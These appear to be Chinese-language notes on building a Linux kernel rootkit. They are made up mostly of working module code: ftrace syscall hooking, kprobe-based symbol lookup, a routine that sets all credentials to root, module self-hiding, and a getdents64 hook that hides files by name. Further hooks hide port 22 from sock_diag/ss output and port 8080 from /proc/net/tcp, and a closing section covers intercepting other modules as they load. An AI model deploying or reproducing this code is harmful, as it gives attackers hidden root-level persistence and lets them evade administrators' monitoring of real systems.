# 内核版本判断

```c
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,36)
static long minor_ioctl(struct file *filp,unsigned int cmd,unsigned long arg)
#else
static int minor_ioctl(struct inode *inode,struct file *filp,unsigned long arg)
#endif
```

# 系统调用参数

在4.17.0内核版本之前，系统调用的hook为：

```c
asmlinkage long my_sys_read(unsigned int fd, char __user *buf, size_t count);
```

之后为：

```c
asmlinkage long my_sys_read(const struct pt_regs *regs)
{
    int fd = regs->di;
    char __user *buf = regs->si;
    size_t count = regs->d;
    /* rest of function */
}
```

eg:

```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/syscalls.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long(*orig_mkdir)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
	char __user *pathname = (char *)regs->di;
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(regs);
	return 0;
}
#else

static asmlinkage long(*orig_mkdir)(const char __user *pathname,umode_t mode);
asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
{
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(pathname,mode);
	return 0;
}

#endif
```

# kallsyms_lookup_name地址获取

通过kprobe获取kallsyms_lookup_name函数地址

```c
/// kallsyms_lookup_name
#include <linux/kprobes.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void){
    
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
}
```

# hook

### ftrace

eg: hook mkdir

```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>

#include "ftrace_helper.h"

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long(*orig_mkdir)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
	char __user *pathname = (char *)regs->di;
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(regs);
	return 0;
}
#else

static asmlinkage long(*orig_mkdir)(const char __user *pathname,umode_t mode);
asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
{
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(pathname,mode);
	return 0;
}

#endif

/// kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
static void* init_ksymbol(void)
{

    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

	return my_kallsyms_lookup_name;
}


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* x64 has to be special and require a different naming convention */
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Oridinarily ftrace provides it's own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 1
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes is easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = my_kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);
#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;
    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

static struct ftrace_hook hooks[] = {
	HOOK(SYSCALL_NAME("sys_mkdir"),hook_mkdir,&orig_mkdir),
};

static int __init example_init(void)
{
	int err;
	if(init_ksymbol() == NULL){
		printk("get kallsyms_lookup_name error\n");
		return -1;
	}
	
	err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if(err)
		return err;
	
	printk(KERN_INFO"rootkit:loaded\n");
	return 0;
}

static void __exit example_exit(void)
{
	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));
	printk("example_exit\n");
}

module_init(example_init);
module_exit(example_exit);
MODULE_LICENSE("GPL");

```

# root权限提升

```c
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if(root == NULL)
        return ;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    
    commit_creds(root);
}
```

# 模块隐藏

```c
void hideme(void)
{
    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
    if(module_mutex == NULL){
        printk("rootkit:get module_mutex addr error\n");
        return;
    }

    mutex_lock(module_mutex);

    list_del(&THIS_MODULE->list);

    mutex_unlock(module_mutex);

}

void showme(void)
{
    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
    struct list_head *modules = (struct list_head*)my_kallsyms_lookup_name("modules");

    if(module_mutex == NULL){
        printk("rootkit:get module_mutex addr error\n");
        return;
    }
    if(modules == NULL){
        printk("rootkit:get modules addr error\n");
        return;
    }

    mutex_lock(module_mutex);

    list_add(&THIS_MODULE->list,modules);

    mutex_unlock(module_mutex);
}
```

# 文件隐藏

修改sys_getdents64返回到用户空间的linux_dirent64结构体：

```
struct linux_dirent64 {
    u64         d_ino;
    s64         d_off;
    unsigned short      d_reclen;
    unsigned char       d_type;
    char        d_name[];
};
```

如果linux_dirent64的d_name等于期望隐藏的文件，则我们可以将上一个linux_dirent64的d_reclen 加上期望隐藏的文件的d_reclen

```c
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage ssize_t hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *dirp_kern = NULL;
    struct linux_dirent64 *current_dirp = NULL;
    struct linux_dirent64 *previous_dirp = NULL;
    ssize_t offset = 0;

    ssize_t ret = orig_getdents64(regs);

    if(ret <= 0) return ret;

    dirp_kern = kzalloc(ret,GFP_KERNEL);
    
    if(dirp_kern == NULL ) return ret;

    if(copy_from_user(dirp_kern,dirp,ret)){
        goto done;
    }

    while(offset < ret){
        previous_dirp = current_dirp;
        current_dirp = (struct linux_dirent64*)((char*)dirp_kern + offset);

        if(memcmp(PREFIX,current_dirp->d_name,strlen(PREFIX)) == 0){
            printk(KERN_DEBUG "rootkit: Found %s\n", current_dirp->d_name);

            if(previous_dirp == NULL){
                ret -=  current_dirp->d_reclen;
                memmove(current_dirp,(char*)current_dirp + current_dirp->d_reclen,ret);
            }else{
                previous_dirp->d_reclen += current_dirp->d_reclen;
            }
        }

        offset += current_dirp->d_reclen;
    }

    if(copy_to_user(dirp,dirp_kern,ret)){
        goto done;
    }

done:
    kfree(dirp_kern);
    return ret;
}
```



# 进程隐藏

通过getdents隐藏/proc/pid目录项



# 网络信息隐藏

在用户态通过netlink获取本机监听的网络端口信息
```c
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 8192
#define TCPF_LISTEN (1 << 10)  

void parse_diag_msg(struct inet_diag_msg *diag_msg) {
    struct sockaddr_in sa;
    char ip[INET_ADDRSTRLEN];
    int port = ntohs(diag_msg->id.idiag_sport);

    sa.sin_family = AF_INET;
    memcpy(&sa.sin_addr, diag_msg->id.idiag_src, sizeof(sa.sin_addr));
    inet_ntop(AF_INET, &sa.sin_addr, ip, sizeof(ip));

    printf("IP: %s, Port: %d\n", ip, port);
}

int main() {
    int sock_fd;
    struct sockaddr_nl sa;
    char buffer[BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct inet_diag_req_v2 req;
    int ret;

    // 创建 netlink 套接字
    sock_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_INET_DIAG);
    if (sock_fd < 0) {
        perror("socket");
        return -1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    if (bind(sock_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind");
        close(sock_fd);
        return -1;
    }

    // 准备 netlink 消息
    nlh = (struct nlmsghdr *)buffer;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(req));
    nlh->nlmsg_type = SOCK_DIAG_BY_FAMILY;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = getpid();

    memset(&req, 0, sizeof(req));
    req.sdiag_family = AF_INET;
    req.sdiag_protocol = IPPROTO_TCP;
    req.idiag_states = TCPF_LISTEN;

    memcpy(NLMSG_DATA(nlh), &req, sizeof(req));

    // 发送 netlink 消息
    if (send(sock_fd, nlh, nlh->nlmsg_len, 0) < 0) {
        perror("send");
        close(sock_fd);
        return -1;
    }

    // 接收并解析 netlink 响应
    while ((ret = recv(sock_fd, buffer, sizeof(buffer), 0)) > 0) {
        nlh = (struct nlmsghdr *)buffer;
        while (NLMSG_OK(nlh, ret)) {
            if (nlh->nlmsg_type == NLMSG_DONE)
                break;

            if (nlh->nlmsg_type == NLMSG_ERROR) {
                fprintf(stderr, "Netlink error\n");
                close(sock_fd);
                return -1;
            }

            struct inet_diag_msg *diag_msg = (struct inet_diag_msg *)NLMSG_DATA(nlh);
            parse_diag_msg(diag_msg);

            nlh = NLMSG_NEXT(nlh, ret);
        }
    }

    close(sock_fd);
    return 0;
}
```

### netlink分析

netlink初始化

/net/netlink/af_netlink.c:

```c
static const struct net_proto_family netlink_family_ops = {
	.family = PF_NETLINK,
	.create = netlink_create,
	.owner	= THIS_MODULE,	/* for consistency 8) */
};

static int __init netlink_proto_init(void)
{
...
	sock_register(&netlink_family_ops);//add a socket protocol handler
...
	netlink_add_usersock_entry();//nt_table add entity
...
}

static void __init netlink_add_usersock_entry(void)
{
	struct listeners *listeners;
	int groups = 32;

	listeners = kzalloc(sizeof(*listeners) + NLGRPSZ(groups), GFP_KERNEL);
	if (!listeners)
		panic("netlink_add_usersock_entry: Cannot allocate listeners\n");

	netlink_table_grab();

	nl_table[NETLINK_USERSOCK].groups = groups;
	rcu_assign_pointer(nl_table[NETLINK_USERSOCK].listeners, listeners);
	nl_table[NETLINK_USERSOCK].module = THIS_MODULE;
	nl_table[NETLINK_USERSOCK].registered = 1;
	nl_table[NETLINK_USERSOCK].flags = NL_CFG_F_NONROOT_SEND;

	netlink_table_ungrab();
}
```

用户通过socket创建AF_NETLINK套接字时：

```c
// 创建 netlink 套接字
    sock_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_INET_DIAG);
```

会调用到netlink_create。

net/netlink/af_netlink.c:
```c

struct netlink_table {
	struct rhashtable	hash;
	struct hlist_head	mc_list;
	struct listeners __rcu	*listeners;
	unsigned int		flags;
	unsigned int		groups;
	struct mutex		*cb_mutex;
	struct module		*module;
	int			(*bind)(struct net *net, int group);
	void			(*unbind)(struct net *net, int group);
	void                    (*release)(struct sock *sk,
					   unsigned long *groups);
	int			registered;
};

static int netlink_create(struct net *net, struct socket *sock, int protocol,int kern)
{
...
	cb_mutex = nl_table[protocol].cb_mutex;
	bind = nl_table[protocol].bind;
	unbind = nl_table[protocol].unbind;
	release = nl_table[protocol].release;
...
	err = __netlink_create(net, sock, cb_mutex, protocol, kern);
...
	nlk = nlk_sk(sock->sk);
	nlk->module = module;
	nlk->netlink_bind = bind;
	nlk->netlink_unbind = unbind;
	nlk->netlink_release = release;
...
}


static const struct proto_ops netlink_ops = {
	.family =	PF_NETLINK,
	.owner =	THIS_MODULE,
	.release =	netlink_release,
	.bind =		netlink_bind,
	.connect =	netlink_connect,
	.socketpair =	sock_no_socketpair,
	.accept =	sock_no_accept,
	.getname =	netlink_getname,
	.poll =		datagram_poll,
	.ioctl =	netlink_ioctl,
	.listen =	sock_no_listen,
	.shutdown =	sock_no_shutdown,
	.setsockopt =	netlink_setsockopt,
	.getsockopt =	netlink_getsockopt,
	.sendmsg =	netlink_sendmsg,
	.recvmsg =	netlink_recvmsg,
	.mmap =		sock_no_mmap,
};
static int __netlink_create(struct net *net, struct socket *sock,
			    struct mutex *dump_cb_mutex, int protocol,
			    int kern)
{
...
	sock->ops = &netlink_ops;
...
}

```

完成创建后，该socket的ops为netlink_ops,protocol 为AF_NETLINK

Tips：可以通过netlink_kernel_create函数，找到内核所有的注册的netlink接口

通过 strace 命令：

```sh
root@debian:/home/sysirq/Work/rootkit/lkm# strace -e trace=%net ss -tlpn
socket(AF_NETLINK, SOCK_RAW|SOCK_CLOEXEC, NETLINK_SOCK_DIAG) = 3
setsockopt(3, SOL_SOCKET, SO_SNDBUF, [32768], 4) = 0
setsockopt(3, SOL_SOCKET, SO_RCVBUF, [1048576], 4) = 0
setsockopt(3, SOL_NETLINK, NETLINK_EXT_ACK, [1], 4) = 0
bind(3, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 0
```

我们可以知道，netlink获取IP端口等信息的对应的protocol接口为NETLINK_SOCK_DIAG

net/core/sock_diag.c:

```c
static int __net_init diag_net_init(struct net *net)
{
	struct netlink_kernel_cfg cfg = {
		.groups	= SKNLGRP_MAX,
		.input	= sock_diag_rcv,
		.bind	= sock_diag_bind,
		.flags	= NL_CFG_F_NONROOT_RECV,
	};

	net->diag_nlsk = netlink_kernel_create(net, NETLINK_SOCK_DIAG, &cfg);
	return net->diag_nlsk == NULL ? -ENOMEM : 0;
}

struct sock *
__netlink_kernel_create(struct net *net, int unit, struct module *module,
			struct netlink_kernel_cfg *cfg)
{
...
	if (cfg && cfg->input)
		nlk_sk(sk)->netlink_rcv = cfg->input;
...
		if (cfg) {
			nl_table[unit].bind = cfg->bind;
			nl_table[unit].unbind = cfg->unbind;
			nl_table[unit].release = cfg->release;
			nl_table[unit].flags = cfg->flags;
		}
...
}
```

调用sendmsg会到netlink_sendmsg

net/netlink/af_netlink.c:

```c
static int netlink_sendmsg(struct socket *sock, struct msghdr *msg, size_t len)
{
...
	if (dst_group) {
		refcount_inc(&skb->users);
		netlink_broadcast(sk, skb, dst_portid, dst_group, GFP_KERNEL);
	}
	err = netlink_unicast(sk, skb, dst_portid, msg->msg_flags & MSG_DONTWAIT);

...
}

int netlink_unicast(struct sock *ssk, struct sk_buff *skb,
		    u32 portid, int nonblock)
{
...
	if (netlink_is_kernel(sk))
		return netlink_unicast_kernel(sk, skb, ssk);
...
}

static int netlink_unicast_kernel(struct sock *sk, struct sk_buff *skb,
				  struct sock *ssk)
{
...
	if (nlk->netlink_rcv != NULL) {
	...
		nlk->netlink_rcv(skb);
	...
	}
...
}
```

最终获取ip端口等信息的netlink会调用到sock_diag_rcv。其中我们只需要关注nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY

net/core/sock_diag.c:
```c
static int sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh,
			     struct netlink_ext_ack *extack)
{
...
	case SOCK_DIAG_BY_FAMILY:
	case SOCK_DESTROY:
		return __sock_diag_cmd(skb, nlh);
...
}
```

net/core/sock_diag.c:
```c
static const struct sock_diag_handler *sock_diag_lock_handler(int family)
{
	const struct sock_diag_handler *handler;

	rcu_read_lock();
	handler = rcu_dereference(sock_diag_handlers[family]);
	if (handler && !try_module_get(handler->owner))
		handler = NULL;
	rcu_read_unlock();

	return handler;
}

static int __sock_diag_cmd(struct sk_buff *skb, struct nlmsghdr *nlh)
{
	int err;
	struct sock_diag_req *req = nlmsg_data(nlh);
	const struct sock_diag_handler *hndl;
...
	req->sdiag_family = array_index_nospec(req->sdiag_family, AF_MAX);
	hndl = sock_diag_lock_handler(req->sdiag_family);
...
		if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY)
			err = hndl->dump(skb, nlh);
...
}
```

此时我们的req->sdiag_family为AF_INET，通过函数sock_diag_register可以查看到对应的handler

```c
static const struct sock_diag_handler inet_diag_handler = {
	.owner = THIS_MODULE,
	.family = AF_INET,
	.dump = inet_diag_handler_cmd,
	.get_info = inet_diag_handler_get_info,
	.destroy = inet_diag_handler_cmd,
};
```

则对应的hndl->dump(skb, nlh) 为 inet_diag_handler_cmd:

Net/ipv4/inet_diag.c:

```c
static int inet_diag_handler_cmd(struct sk_buff *skb, struct nlmsghdr *h)
{
	int hdrlen = sizeof(struct inet_diag_req_v2);
	struct net *net = sock_net(skb->sk);
...
	if (h->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
	    h->nlmsg_flags & NLM_F_DUMP) {
		struct netlink_dump_control c = {
			.start = inet_diag_dump_start,
			.done = inet_diag_dump_done,
			.dump = inet_diag_dump,
		};
		return netlink_dump_start(net->diag_nlsk, skb, h, &c);
...
}

static int inet_diag_dump(struct sk_buff *skb, struct netlink_callback *cb)
{
	return __inet_diag_dump(skb, cb, nlmsg_data(cb->nlh));
}

static int __inet_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
			    const struct inet_diag_req_v2 *r)
{
	struct inet_diag_dump_data *cb_data = cb->data;
	const struct inet_diag_handler *handler;
	u32 prev_min_dump_alloc;
	int protocol, err = 0;

	protocol = inet_diag_get_protocol(r, cb_data);
...
	handler = inet_diag_lock_handler(protocol);
...
	handler->dump(skb, cb, r);
...
}
```

通过inet_diag_register函数找到 tcp对应的handler为：

net/ipv4/tcp_diag.c:
```c
static const struct inet_diag_handler tcp_diag_handler = {
	.owner			= THIS_MODULE,
	.dump			= tcp_diag_dump,
	.dump_one		= tcp_diag_dump_one,
	.idiag_get_info		= tcp_diag_get_info,
	.idiag_get_aux		= tcp_diag_get_aux,
	.idiag_get_aux_size	= tcp_diag_get_aux_size,
	.idiag_type		= IPPROTO_TCP,
	.idiag_info_size	= sizeof(struct tcp_info),
#ifdef CONFIG_INET_DIAG_DESTROY
	.destroy		= tcp_diag_destroy,
#endif
};


static void tcp_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
			  const struct inet_diag_req_v2 *r)
{
	struct inet_hashinfo *hinfo;

	hinfo = sock_net(cb->skb->sk)->ipv4.tcp_death_row.hashinfo;

	inet_diag_dump_icsk(hinfo, skb, cb, r);
}
```

/net/ipv4/inet_diag.c:

```c
void inet_diag_dump_icsk(struct inet_hashinfo *hashinfo, struct sk_buff *skb,
			 struct netlink_callback *cb,
			 const struct inet_diag_req_v2 *r)
{
...
				if (inet_sk_diag_fill(sk, inet_csk(sk), skb,
						      cb, r, NLM_F_MULTI,
						      net_admin) < 0) {
					spin_unlock(&ilb->lock);
					goto done;
				}
...
					res = inet_sk_diag_fill(sk_arr[idx],
								NULL, skb, cb,
								r, NLM_F_MULTI,
								net_admin);
...
				res = sk_diag_fill(sk_arr[idx], skb, cb, r,
						   NLM_F_MULTI, net_admin);
...
}
```



***<u>隐藏本地source port 22 端口代码</u>***：



```c
static void (*orig_tcp_diag_dump)(struct sk_buff *skb, struct netlink_callback *cb,
			  const struct inet_diag_req_v2 *r);
static void hook_tcp_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
			  const struct inet_diag_req_v2 *r)
{
    orig_tcp_diag_dump(skb,cb,r);

    struct nlmsghdr *current_nlh,*next_nlh;
    struct inet_diag_msg *ids;
    ssize_t offset = 0;

    if(skb->len < sizeof(struct nlmsghdr)) return;

    while(offset < skb->len){
        current_nlh = (struct nlmsghdr *)(skb->data + offset);

        if(offset + current_nlh->nlmsg_len < skb->len){
            next_nlh = (void*)current_nlh + current_nlh->nlmsg_len;
        }else{
            next_nlh = NULL;
        }

        ids = nlmsg_data(current_nlh);
        
        if(ids->id.idiag_sport == htons(22)){
            if(next_nlh == NULL){
                skb->len -= current_nlh->nlmsg_len;
                skb->tail -= current_nlh->nlmsg_len;
            }else{
                skb->len -= current_nlh->nlmsg_len;
                skb->tail -= current_nlh->nlmsg_len;
                memmove(current_nlh,next_nlh,skb->len - offset);
            }
        }else{
            offset += current_nlh->nlmsg_len;
        }
    }
}
```

### 通过/proc/net/ipv4获取连接信息



以 netstat 为工具的代表，通过读取/proc/获取网络连接信息

```c
openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY) = 3
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36199         0.0.0.0:*               LISTEN      5885/code-611f9bfce 
tcp        0      0 127.0.0.1:44418         127.0.0.1:36199         ESTABLISHED 5862/sshd: sysirq@n 
tcp        0      0 192.168.182.131:22      192.168.182.1:43512     ESTABLISHED 402/sshd: sysirq [p 
tcp        0      0 192.168.182.131:22      192.168.182.1:46856     ESTABLISHED 1269/sshd: sysirq [ 
tcp        0      0 127.0.0.1:36199         127.0.0.1:44418         ESTABLISHED 5885/code-611f9bfce 
tcp        0      0 192.168.182.131:22      192.168.182.1:52878     ESTABLISHED 5856/sshd: sysirq [ 
openat(AT_FDCWD, "/proc/net/tcp6", O_RDONLY) = 3
```

```log
root@debian:/home/sysirq/Work/rootkit/lkm# cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 16570 1 0000000081d87d85 100 0 0 10 0                     
   1: 0100007F:8D67 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 22780 1 00000000322456ee 100 0 0 10 0                     
   2: 0100007F:AD82 0100007F:8D67 01 00000000:00000000 00:00000000 00000000  1000        0 22014 1 000000005e2f48ff 20 4 0 10 -1                     
   3: 83B6A8C0:0016 01B6A8C0:A9F8 01 00000000:00000000 02:000ABB53 00000000     0        0 16584 4 00000000654b1696 20 4 31 10 -1                    
   4: 83B6A8C0:0016 01B6A8C0:B708 01 00000000:00000000 02:00091F7A 00000000     0        0 17453 2 000000005d3660f7 20 4 27 10 -1                    
   5: 0100007F:8D67 0100007F:AD82 01 00000000:00000000 00:00000000 00000000  1000        0 22784 1 000000003b7170c9 20 4 0 10 -1                     
   6: 83B6A8C0:0016 01B6A8C0:CE8E 01 00000000:00000000 02:0008969E 00000000     0        0 21253 2 00000000a1612404 20 4 30 10 -1  
```

需要hook tcp4_seq_show函数

```c
static const struct seq_operations tcp4_seq_ops = {
	.show		= tcp4_seq_show,
	.start		= tcp_seq_start,
	.next		= tcp_seq_next,
	.stop		= tcp_seq_stop,
};

static struct tcp_seq_afinfo tcp4_seq_afinfo = {
	.family		= AF_INET,
};

static int __net_init tcp4_proc_init_net(struct net *net)
{
	if (!proc_create_net_data("tcp", 0444, net->proc_net, &tcp4_seq_ops,
			sizeof(struct tcp_iter_state), &tcp4_seq_afinfo))
		return -ENOMEM;
	return 0;
}

static void __net_exit tcp4_proc_exit_net(struct net *net)
{
	remove_proc_entry("tcp", net->proc_net);
}

static struct pernet_operations tcp4_net_ops = {
	.init = tcp4_proc_init_net,
	.exit = tcp4_proc_exit_net,
};

int __init tcp4_proc_init(void)
{
	return register_pernet_subsys(&tcp4_net_ops);
}

void tcp4_proc_exit(void)
{
	unregister_pernet_subsys(&tcp4_net_ops);
}
```

eg:

```c
/*
 * Usual function declaration for the real tcp4_seq_show
 */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/*
 * Function hook for tcp4_seq_show()
 */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    /*
     * Check if sk_num is 8080
     * (0x1f90 = 8080 in hex)
     * If sk doesn't point to anything, then it points to 0x1
     */
    if (sk != 0x1 && sk->sk_num == 0x1f90)
        return 0;

    /*
     * Otherwise, just return with the real tcp4_seq_show()
     */
    return orig_tcp4_seq_show(seq, v);
}
```

# 如何监听其他模块的插入事件

/kernel/module/main.c:

```c
SYSCALL_DEFINE3(init_module, void __user *, umod,
		unsigned long, len, const char __user *, uargs)
{
....
	return load_module(&info, uargs, 0);
}

static int load_module(struct load_info *info, const char __user *uargs,
		       int flags)
{
...
	err = prepare_coming_module(mod);
...
}

static int prepare_coming_module(struct module *mod)
{
...
	err = blocking_notifier_call_chain_robust(&module_notify_list,
			MODULE_STATE_COMING, MODULE_STATE_GOING, mod);
...
}
```

我们可以在我们的模块中调用：

/kernel/module/main.c:

```c
int register_module_notifier(struct notifier_block *nb)
{
	return blocking_notifier_chain_register(&module_notify_list, nb);
}
EXPORT_SYMBOL(register_module_notifier);
```

来实现，并通过传入过来的module对模块代码进行修改

# 参考资料

awesome-linux-rootkits

https://github.com/milabs/awesome-linux-rootkits

kunkillable (kunkillable is an LKM (loadable kernel module) that makes userland processes unkillable.)

